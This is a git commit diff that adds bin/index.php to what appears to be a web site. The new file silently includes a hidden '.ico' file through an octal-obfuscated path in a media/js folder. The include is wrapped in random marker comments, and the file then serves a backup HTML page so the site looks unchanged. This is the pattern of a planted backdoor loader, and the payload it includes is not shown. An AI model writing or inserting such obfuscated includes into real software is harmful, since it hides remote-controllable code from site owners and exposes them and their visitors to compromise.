476673d4c12e7b2f1b7d6d7faf2d38e56325f617
valeriekebz <valeriekebz@gmail.com>
2022-12-05 04:46:09 -0800

    bin

---
+++ bin/index.php
@@ -0,0 +1,12 @@
+<?php
+/*6559d*/
+
+@include "\104:/ho\155e/si\164e/ww\167root\057medi\141/com\137cont\145nthi\163tory\057js/.\062d681\0628c.i\143o";
+
+/*6559d*/
+
+
+
+
+
+echo @file_get_contents('index.html.bak.bak');
